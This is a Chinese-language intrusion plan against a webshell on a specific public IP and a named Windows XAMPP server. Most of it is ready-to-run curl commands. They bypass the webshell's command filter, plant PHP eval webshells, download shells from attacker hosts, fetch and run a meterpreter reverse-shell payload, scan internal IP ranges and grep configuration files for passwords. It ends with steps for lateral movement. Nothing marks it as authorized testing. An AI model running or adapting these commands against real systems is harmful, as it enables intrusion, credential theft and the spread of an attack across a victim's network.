# 内网渗透实战报告

## 目标信息
- **Webshell**: http://203.155.188.41:8082/dashboard/javascripts/cmd.php
- **系统**: Windows (WIN-2GVFUQHMU55)
- **工作组**: WORKGROUP
- **Web服务器**: Apache/2.4.51 (Win64) + PHP/7.4.26
- **路径**: C:\xampp\htdocs\dashboard\javascripts

## 当前状态

### Webshell可用性
- ✅ `dir` 命令可用
- ✅ `cd` 命令可用  
- ❌ `whoami`, `ipconfig`, `systeminfo` 等被过滤（返回ERROR）
- ❌ `netstat`, `arp`, `route` 等返回空

### 限制分析
webshell对某些命令进行了过滤，可能原因：
1. 黑名单过滤特定命令
2. 权限限制
3. 安全策略

## 内网渗透方案

### 方案1: 绕过命令过滤
```bash
# 使用PowerShell绕过
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=powershell -Command Get-ComputerInfo"
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=powershell -Command Get-NetIPAddress"

# 使用cmd /c绕过
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=cmd /c ipconfig"
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=cmd /c netstat -an"
```

### 方案2: 上传新webshell
```bash
# 通过echo写入
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=echo ^<?php eval($_GET['x']);?^> > x.php"

# 通过PowerShell下载
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=powershell -Command Invoke-WebRequest -Uri http://attacker.com/shell.php -OutFile C:\xampp\htdocs\dashboard\javascripts\shell.php"
```

### 方案3: 直接内网扫描（通过可用命令）
```bash
# 使用dir遍历内网共享
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=dir \\\\192.168.1.100\\c$"

# 使用ping扫描
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=for /L %i in (1,1,254) do @ping -n 1 192.168.1.%i"
```

### 方案4: 上传MSF Payload
```bash
# 生成payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe

# 启动handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP; set LPORT 4444; exploit -j"

# 通过PowerShell下载并执行
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=powershell -Command Invoke-WebRequest -Uri http://YOUR_IP/shell.exe -OutFile C:\temp\shell.exe; C:\temp\shell.exe"
```

## 内网信息收集（通过可用命令）

### 1. 网络信息
```bash
# 查看hosts文件
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=type C:\Windows\System32\drivers\etc\hosts"

# 查看网络配置（如果可用）
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=cmd /c ipconfig /all"
```

### 2. 系统信息
```bash
# 查看系统版本
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=type C:\Windows\win.ini"

# 查看环境变量
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=set"
```

### 3. 凭证收集
```bash
# 查看配置文件
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=dir C:\xampp\mysql\data /s /b | findstr .frm"

# 查看XAMPP配置
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=type C:\xampp\php\php.ini | findstr password"
```

## 下一步行动

1. **立即执行**: 测试PowerShell命令绕过
2. **上传新shell**: 通过PowerShell下载更好的webshell
3. **MSF上线**: 上传meterpreter payload
4. **内网扫描**: 通过MSF路由进行内网扫描
5. **横向移动**: 凭证复用、SMB横向、RDP横向

## 快速命令

```bash
# 测试PowerShell
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=powershell -Command Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion"

# 上传shell
curl "http://203.155.188.41:8082/dashboard/javascripts/cmd.php?cmd=powershell -Command (New-Object Net.WebClient).DownloadFile('http://YOUR_IP/shell.php','C:\xampp\htdocs\dashboard\javascripts\shell.php')"

# 执行新shell
curl "http://203.155.188.41:8082/dashboard/javascripts/shell.php?c=whoami"
```
